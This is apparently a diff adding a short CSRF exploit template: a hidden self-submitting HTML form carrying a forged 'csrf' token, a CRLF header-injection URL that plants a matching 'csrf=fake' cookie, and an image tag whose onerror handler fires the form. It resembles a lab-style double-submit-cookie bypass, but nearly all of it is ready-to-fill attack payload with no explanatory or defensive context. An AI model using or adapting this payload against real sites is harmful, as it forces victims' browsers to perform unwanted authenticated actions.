@@ -1,0 +1,11 @@
+<form method="$method" action="$url">
+     <input type="hidden" name="$param1name" value="$param1value">
+     <input required="" type="hidden" name="csrf" value="fake">
+</form>
+<script>
+      document.forms[0].submit();
+</script> 
+
+
+Cookie injection url --> /?search=test%0d%0aSet-Cookie:%20csrf=fake 
+<img src="$cookie-injection-url" onerror="document.forms[0].submit();"/> 
